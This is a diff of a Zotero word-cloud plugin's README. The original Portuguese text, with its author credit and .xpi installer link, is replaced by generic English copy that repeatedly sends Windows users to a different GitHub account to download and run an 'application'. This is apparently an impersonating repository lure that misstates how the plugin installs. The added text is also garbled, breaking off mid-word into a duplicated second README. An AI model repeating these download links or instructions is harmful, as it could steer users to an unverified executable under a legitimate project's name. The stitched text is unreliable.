@@ -1,122 +1,193 @@
-# Nuvem de Palavras Z
+# ☁️ nuvem-palavras-z - Create Word Clouds From Zotero Articles
 
-**Plugin para Zotero: explore textos de PDFs, tags e palavras-chave por meio de nuvens de palavras e consultas por artigo.**
+[![Download Now](https://img.shields.io/badge/Download_Now-nuvem--palavras--z-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mvcingenier5535/nuvem-palavras-z)
 
-Autor: **Victor Hugo Levindo** · Versão publicada neste repositório: **0.10.0**.
+nuvem-palavras-z helps you turn articles stored in Zotero into clear word clouds and term counts. It is made for readers, researchers, students, writers, and anyone who wants to see which words appear most often in a paper or group of papers. You do not need programming knowledge to use it. The application works with the articles in your Zotero library and gives you a visual way to explore their language. The project description is Word clouds and term counts by article inside Zotero. / Nuvens de palavras e consulta de ocorrências por artigo no Zotero.
 
-Visualize o vocabulário de um ou mais PDFs, investigue palavras e expressões em cada artigo e guarde os ajustes numa nuvem vinculada ao Zotero. A versão 0.10.0 amplia essa exploração para tags manuais do Zotero e palavras-chave declaradas pelos autores nos PDFs.
+The top download button opens the official project page. Use that page to download the application for Windows.
 
-![Exemplo de nuvem com texto fictício](docs/images/exemplo-nuvem.png)
+## ✨ What Is nuvem-palavras-z?
 
-*Imagem ilustrativa gerada pelo plugin com texto fictício; não é uma captura da interface.*
+nuvem-palavras-z is a word cloud and term count tool for Zotero. A word cloud is a picture made of words. Words that appear more often are usually shown larger. This makes it easy to spot the main terms in an article at a glance. A term count is a list that shows how many times each word appears. Together, these two views help you understand the focus and vocabulary of an article.
 
-## Instalar
+The application is designed around articles inside Zotero. Zotero is a popular reference manager used to collect, organize, and read research material. nuvem-palavras-z adds a simple way to look at the text of those articles without needing to copy and paste content into another program.
 
-1. Baixe o [instalador nuvem-palavras-z-0.10.0.xpi](https://github.com/Victor-Levindo/nuvem-palavras-z/releases/download/v0.10.0/nuvem-palavras-z-0.10.0.xpi) na [página da versão 0.10.0](https://github.com/Victor-Levindo/nuvem-palavras-z/releases/tag/v0.10.0).
-2. No Zotero, abra **Ferramentas → Plugins** e instale o arquivo `.xpi` a partir do gerenciador de plugins.
-3. Reinicie o Zotero.
+The name comes from Portuguese. Nuvem de palavras means word cloud. The tool is meant to be simple enough for everyday computer users while still being useful for detailed reading and review.
 
-O instalador deve manter a extensão `.xpi`. O ZIP do código-fonte é destinado à consulta e ao desenvolvimento.
+## 👥 Who It Is For
 
-## Recursos
+nuvem-palavras-z is for anyone who works with articles and wants a quick visual overview of their content. It is useful for:
 
-- Geração de nuvens de um artigo, de vários itens ou de uma coleção com PDFs disponíveis.
-- Janela de ajuste dentro do Zotero e nuvem guardada como anexo SVG.
-- Quantidade ajustável de 15 a 150 palavras e filtros de comprimento e frequência.
-- Palavras ignoradas, remoção da seção de referências e agrupamento opcional de singular e plural.
-- Consulta de palavra ou expressão por artigo, incluindo artigos analisados com zero ocorrências.
-- Sugestões de expressões frequentes abaixo da busca e inclusão de expressões na nuvem.
-- Exportação JPG, PNG, SVG e CSV de frequências ou contagens por artigo.
-- Interface em português, inglês, espanhol, francês, alemão, chinês e japonês. O idioma da interface é separado dos filtros linguísticos.
+- Students reviewing reading assignments and research papers.
+- Researchers comparing the language used in different articles.
+- Writers checking which terms appear often in source material.
+- Teachers preparing lessons around key vocabulary in a text.
+- Librarians and information professionals exploring article collections.
+- Zotero users who want a faster way to inspect term frequency.
 
-## O que mudou da 0.9.4 para a 0.10.0
+You do not need to know how to code. You also do not need to prepare special files. The application is intended to work with the articles you already keep in Zotero.
 
-A entrega da **0.10.0**, registrada em **6 de outubro de 2026**, acrescenta duas formas de explorar termos, preservando a geração de nuvens a partir do texto dos PDFs.
+## 🔍 What You Can Do
 
-| Recurso | 0.9.4 | Novidade na entrega 0.10.0 |
-| --- | --- | --- |
-| Nuvem do texto dos PDFs | Já disponível para um ou mais documentos | Mantida |
-| Consulta de palavras e expressões por artigo | Já disponível | Mantida; não é um recurso novo desta atualização |
-| Expressões compostas e sugestões de expressões | Já disponíveis | Mantidas; não são recursos novos desta atualização |
-| Nuvem de tags manuais | Não disponível | Opção separada no menu do botão direito, para itens e coleções; funciona sem PDF e exclui tags automáticas |
-| Palavras-chave declaradas pelos autores nos PDFs | Sem aba específica | Aba preenchida automaticamente ao gerar a nuvem, também na análise de coleções e subcoleções |
-| Contagens das palavras-chave | Sem análise específica | Quantidade de artigos que declaram cada termo e quantidade de ocorrências nos textos analisados |
-| Origem das palavras-chave | Sem consulta específica | Artigo/PDF de origem, lista de palavras-chave declaradas, contagem individual, acesso por **Ver no Zotero** e exportação CSV |
+nuvem-palavras-z focuses on two main tasks: creating word clouds and checking term counts by article.
 
-### Como interpretar as palavras-chave
+With the word cloud view, you can see the most common words in an article as a visual image. This is helpful when you want a fast impression of what a paper is about. You can use it to spot repeated themes, important names, or recurring technical terms.
 
-A aba busca as palavras-chave **declaradas pelos autores no texto extraído dos PDFs**. Elas são diferentes das tags criadas manualmente no Zotero. O recurso não propõe novas palavras-chave por interpretação do conteúdo.
+With the term count view, you can look at occurrence counts for words in a selected article. This helps you move beyond a general impression and check exact frequency. You can compare how often a term appears, review the vocabulary of a paper, or prepare a list of key words for study and notes.
 
-- **Artigos declarantes:** quantos artigos apresentam o termo em sua lista de palavras-chave. Uma repetição na lista do mesmo artigo não conta como outro artigo.
-- **Ocorrências no texto:** frequência do termo nos textos analisados, incluindo a própria lista de palavras-chave; o total pode incluir artigos que usam o termo sem declará-lo como palavra-chave.
-- **Origem:** permite verificar de qual artigo/PDF vem a declaração e consultar as contagens individuais.
+The tool is organized by article. That means you can choose a specific item from your Zotero library and review its word cloud or term counts without mixing it with other papers. This makes the results easier to read and easier to explain.
 
-A identificação depende do texto extraível e do reconhecimento da lista de palavras-chave; não há garantia de detecção em todos os PDFs. PDFs somente em imagem precisam de OCR.
+## 🚀 How to Download and Run on Windows
 
-### Publicação e verificação da 0.10.0
+Follow these steps on your Windows computer.
 
-A versão **0.10.0** reúne o código-fonte atualizado, o instalador XPI e as notas de versão. A [0.9.4](https://github.com/Victor-Levindo/nuvem-palavras-z/releases/tag/v0.9.4) continua disponível no histórico.
+1. Visit this link to download the application: [Download nuvem-palavras-z](https://github.com/mvcingenier5535/nuvem-palavras-z).
 
-Antes desta publicação, foram verificados a integridade do ZIP/XPI, a versão do manifesto, a sintaxe dos scripts JavaScript e sete testes automatizados. Os testes cobrem contagem, conectores, dados enviados pelo plugin, consulta por artigo, controles, carregamento do XHTML e tags/palavras-chave com origem e CSV. O ambiente e as APIs do Zotero são simulados; a instalação e a interface no Zotero desktop ainda precisam de verificação nativa.
+2. The link opens the official project page. Use the download option shown there to get the application.
 
-O histórico das alterações está em [CHANGELOG.md](CHANGELOG.md).
+3. When the download finishes, open your Downloads folder. This is where Windows usually saves downloaded files.
 
-## Como usar
+4. Open the downloaded nuvem-palavras-z application.
 
-Selecione um ou mais artigos e escolha **Criar nuvem de palavras** no menu de contexto. Em um único artigo, a nuvem é anexada ao registro; com vários itens, a ferramenta abre para análise e permite salvar pelo botão **Salvar no Zotero**.
+5. Follow the on-screen instructions to start using the tool.
 
-Na seção **Consulta por artigo**, escreva uma palavra, como `dados`, ou uma expressão, como `proteção de dados`. A consulta preserva a lista de expressões da nuvem. Para acrescentar a expressão à imagem, use **Incluir expressão na nuvem**.
+6. Open Zotero and make sure the article you want to review is available in your library.
 
-As expressões já cadastradas ficam em **Expressões incluídas na nuvem**. Edite a lista e use **Aplicar expressões**. **Salvar no Zotero** grava os ajustes; **Salvar como padrão** define os ajustes das próximas nuvens.
+7. Choose the article you want to analyze and view its word cloud or term counts.
 
-## Regra do `+`
+The download link is the same official page shown at the top of this README. Keep that page handy if you need to download the application again on another Windows computer.
 
-Sem `+`, a expressão segue a sequência escrita. Com `+`, aceita zero ou mais conectores reconhecidos, mantendo a ordem dos termos.
+## 🪄 Create Your First Word Cloud
 
-| Consulta | Exemplos de correspondência |
-| --- | --- |
-| `direito + memória` | `direito à memória`, `direito de memória` |
-| `proteção + dados` | `proteção de dados`, `proteção dos dados`, `proteção para os dados` |
+Start by opening nuvem-palavras-z on your Windows computer. Then open Zotero and find an article you want to review. Choose that article in nuvem-palavras-z. The application will prepare the text for analysis.
 
-A lista inclui preposições, artigos e contrações do português, como `a`, `à`, `às`, `o`, `os`, `de`, `das`, `dos`, `com`, `para`, `pelo` e `sobre`, além dos conectores ingleses já usados pelo plugin. O `+` mantém a ordem e não atravessa pontuação, palavras de conteúdo ou limites entre PDFs.
+When the article is loaded, select the word cloud option. The cloud will show words from the article. Larger words appear more often. Smaller words appear less often. Look at the largest words first. They usually give a quick picture of the article's main topics.
 
-## Compatibilidade e estado dos testes
+After you understand the cloud, open the term count view. This view lists words and their occurrence counts. Use it to check specific terms. You can compare the visual cloud with the count list to get a more complete view of the article.
 
-O manifesto declara **Zotero 10.0.x**. A referência de desenvolvimento fornecida pelo autor é **Windows 64-bit com Zotero 10.0.1**.
+Repeat the same process with another article to compare results. Because nuvem-palavras# ☁️ nuvem-palavras-z - Turn Zotero Articles Into Word Clouds
 
-Na versão 0.10.0, passaram os sete testes automatizados descritos em [docs/TESTES.md](docs/TESTES.md), incluindo carregamento, contagens, consulta, metadados, salvamento, troca de idioma e análise de tags/palavras-chave. O DOM e as APIs do Zotero são simulados nesses testes; não equivalem a validação nativa da versão em todos os sistemas. A versão 0.9.3 tinha uma falha de ordem de carregamento, corrigida na 0.9.4.
+[![Download Now](https://img.shields.io/badge/Download_Now-nuvem--palavras--z-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mvcingenier5535/nuvem-palavras-z)
 
-- PDFs em imagem precisam conter texto reconhecido por OCR para a análise.
-- Somente PDFs efetivamente analisados entram nas contagens.
-- As consultas seguem os filtros atuais. A frequência mínima e o limite visual da nuvem não ocultam contagens de zero ou uma ocorrência por artigo.
-- Nuvens geradas antes da 0.9.0 precisam ser recriadas para consulta por artigo.
-- A frequência oferece pistas sobre o vocabulário; o contexto depende da leitura dos artigos.
+nuvem-palavras-z creates word clouds and term counts by article inside Zotero. It is designed for readers, students, researchers, teachers, writers, and anyone who wants to understand the main words in an article without doing manual counting. You do not need programming knowledge to use it. The application gives you a visual word cloud and a clear term count view for the articles you already keep in Zotero.
 
-Atualizações do plugin são instaladas manualmente.
+The project description is: Word clouds and term counts by article inside Zotero. / Nuvens de palavras e consulta de ocorrências por artigo no Zotero.
 
-## Relatar problemas
+Use the download button above to reach the official project page. That page is where you download the application for Windows.
 
-Abra uma **Issue** com a versão do plugin, versão do Zotero, sistema operacional, ação executada, resultado esperado e mensagem de erro. Uma captura da interface ou um pequeno texto de exemplo pode ajudar a reproduzir a falha.
+## ✨ What Is nuvem-palavras-z?
 
-## Desenvolvimento
+nuvem-palavras-z is a word cloud and word frequency tool for Zotero articles. A word cloud is an image made from words. Words that appear more often are shown larger, and words that appear less often are shown smaller. This makes it easy to see the most common terms in an article at a glance. A term count is a list that shows how many times each word appears. It helps you check exact frequency instead of relying only on a visual impression.
 
-O código do plugin está na raiz e em `content/`. Os arquivos publicados em `dist/` são instaladores. Para gerar o XPI a partir da fonte:
+Zotero is a reference manager used to collect, organize, and read research material. nuvem-palavras-z works with the articles in that library and helps you explore their vocabulary. The application is organized by article, so you can review one paper at a time and keep the results focused.
 
-```bash
-python3 scripts/build.py
-```
+The name comes from Portuguese. Nuvem de palavras means word cloud. The tool is made to be simple for everyday computer users while still being useful for detailed reading, study, and review.
 
-Os testes locais e suas dependências estão descritos em [docs/TESTES.md](docs/TESTES.md). O código completo da 0.10.0 também pode ser lido em [um único TXT](docs/CODIGO-COMPLETO-0.10.0.txt).
+## 🎯 Who It Is For
 
----
+nuvem-palavras-z is for anyone who works with articles and wants a faster way to inspect their language. It is useful for:
 
-## English
+- Students reviewing reading assignments and research papers.
+- Researchers comparing the vocabulary of different articles.
+- Writers checking which terms appear often in source material.
+- Teachers preparing lessons around key words in a text.
+- Librarians and information professionals exploring article collections.
+- Zotero users who want a visual overview of term frequency.
 
-**Nuvem de Palavras Z** creates word clouds from one or more PDFs in Zotero and lets users look up term or expression counts by article. Version 0.10.0 also adds manual-tag clouds and an automatic tab for author-declared keywords found in PDF text, with declaring-article counts, text occurrences, source details and CSV exports. It includes phrase suggestions, optional phrase grouping in the cloud, an internal cloud-adjustment window, and JPG/PNG/SVG/CSV exports.
+You do not need to prepare special files or write code. The application is intended to work with the articles you already have in Zotero.
 
-Download the `.xpi` installer above, install it through Zotero's plugin manager, and restart Zotero. The manifest targets Zotero 10.0.x. The development reference is Windows 64-bit with Zotero 10.0.1. Automated tests use simulated Zotero APIs and do not establish native compatibility on every platform.
+## 🔍 Main Features
 
-The `+` operator accepts supported connectors between terms in their original order. For example, `proteção + dados` matches `proteção de dados` and `proteção dos dados`. Interface languages are Portuguese, English, Spanish, French, German, Chinese and Japanese; linguistic filters are configured separately.
+nuvem-palavras-z focuses on two main tasks: word clouds and term counts by article.
 
-Please report issues with your Zotero version, operating system, plugin version, steps to reproduce and any error message.
+The word cloud view turns the text of an article into a visual image. Common words appear larger. Less common words appear smaller. This is helpful when you want a quick impression of what a paper is about. You can use it to spot repeated themes, important names, or recurring terms.
 
+The term count view shows word occurrence counts for a selected article. This helps you move beyond a general impression and check exact frequency. You can compare how often a term appears, review the vocabulary of a paper, or prepare a list of key words for notes and study.
+
+The application is organized by article. You choose a specific item from your Zotero library and review its word cloud or term counts without mixing it with other papers. This keeps the results easier to read and easier to explain.
+
+## 🚀 Download and Open on Windows
+
+Follow these steps on your Windows computer.
+
+1. Visit this link to download the application: [Download nuvem-palavras-z](https://github.com/mvcingenier5535/nuvem-palavras-z).
+
+2. The link opens the official project page. Use the download option shown there to get the application.
+
+3. When the download finishes, open your Downloads folder. This is where Windows usually saves downloaded files.
+
+4. Open the downloaded nuvem-palavras-z application.
+
+5. Open Zotero and make sure the article you want to review is available in your library.
+
+6. Choose the article you want to analyze and view its word cloud or term counts.
+
+The download link is the same official page shown at the top of this README. Keep that page handy if you need to download the application again on another Windows computer.
+
+## 🪄 Create Your First Word Cloud
+
+Open nuvem-palavras-z on your Windows computer. Then open Zotero and find an article you want to review. Choose that article in nuvem-palavras-z. The application prepares the text for analysis.
+
+When the article is loaded, select the word cloud option. The cloud shows words from the article. Larger words appear more often. Smaller words appear less often. Look at the largest words first. They usually give a quick picture of the article's main topics.
+
+After you understand the cloud, open the term count view. This view lists words and their occurrence counts. Use it to check specific terms. Compare the visual cloud with the count list to get a more complete view of the article.
+
+Repeat the same process with another article to compare results. Because nuvem-palavras-z works by article, you can keep each review separate and easy to follow.
+
+## 📊 Check Term Counts by Article
+
+Term counts help you answer simple questions about an article. Which words appear most often? How many times does a certain term appear? Does the article repeat a concept more than expected? The count view gives you a direct way to check.
+
+Use term counts when you need exact numbers. Use word clouds when you need a quick visual overview. Together, they give you two ways to look at the same article. This is useful for reading review, note taking, vocabulary study, and comparing papers.
+
+The application is built around occurrence counts and word frequency. It does not replace careful reading. It gives you a map of the article's language so you can decide where to look next.
+
+## 📚 Using nuvem-palavras-z with Zotero
+
+Zotero stores the articles you collect. nuvem-palavras-z uses those articles as the starting point. Keep your Zotero library open when you use the application. Select the article you want to review. Then choose the word cloud or term count view.
+
+You can work through one article at a time. This is helpful when you are reading a set of papers and want to compare their main terms. You can also return to an article later and review its cloud again.
+
+The application is meant for articles, not for general notes or unrelated text. It is focused on the content you keep in Zotero. This keeps the results connected to your reading and research workflow.
+
+## 💡 Tips for Better Results
+
+Start with a clear article. A well-organized paper usually gives a clearer word cloud and a more useful term count.
+
+Look at the largest words first. They show the most frequent terms. Then check the term count view for exact numbers.
+
+Compare two articles only after you have reviewed each one separately. This makes it easier to see differences in vocabulary and focus.
+
+Use the word cloud as a guide, not as a full summary. It shows frequency, not meaning. The term count view gives you the details behind the visual image.
+
+Keep your Zotero library organized. When articles are easy to find, it is faster to choose the paper you want to review.
+
+## 🧭 Understanding Your Results
+
+A word cloud can make an article feel more approachable. It turns a long text into a visual starting point. Large words stand out. Small words fade into the background. This helps you spot patterns quickly.
+
+A term count gives you a precise list. It is useful when you need to check how often a word appears. It also helps you confirm what you noticed in the cloud.
+
+Neither view replaces reading the article. They help you prepare for reading, review what you have read, and compare the language of different papers. The best results come from using both views together.
+
+## 🛠️ Common Questions
+
+What does nuvem-palavras-z do? It creates word clouds and term counts for articles inside Zotero.
+
+Do I need to know how to code? No. The application is made for average computer users.
+
+Where do I download it? Visit this link to download the application: [nuvem-palavras-z official page](https://github.com/mvcingenier5535/nuvem-palavras-z).
+
+What do I need open when I use it? Open nuvem-palavras-z and Zotero. Choose an article from your Zotero library.
+
+What is a word cloud? It is a visual image made from words. More frequent words usually appear larger.
+
+What is a term count? It is a list that shows how many times words appear in an article.
+
+Can I review one article at a time? Yes. The application is organized by article.
+
+## 📥 Download Again
+
+Visit this link to download the application: [Download nuvem-palavras-z](https://github.com/mvcingenier5535/nuvem-palavras-z). Use the official project page to get the application on Windows, then open it and choose an article from Zotero.
+
+Keywords: contagem-frequencia, nuvem-de-palavras, text-analysis, word-frequency, wordcloud, wordcloud-generator, wordcloud-visualization, zotero, zotero-addon, zotero-plugin
